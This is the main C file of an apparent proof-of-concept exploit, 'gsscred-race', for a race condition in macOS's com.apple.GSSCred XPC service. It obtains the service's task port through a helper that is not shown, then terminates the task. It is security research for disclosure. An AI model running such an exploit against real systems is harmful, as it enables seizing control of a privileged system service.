/*
 * gsscred-race
 * Brandon Azad
 *
 * Exploit a race condition in the com.apple.GSSCred XPC service.
 */

#include <stdio.h>

#include "gsscred_race.h"

int main(int argc, const char *argv[]) {
	mach_port_t gsscred_task = gsscred_race();
	if (gsscred_task == MACH_PORT_NULL) {
		return 1;
	}
	task_terminate(gsscred_task);
	return 0;
}
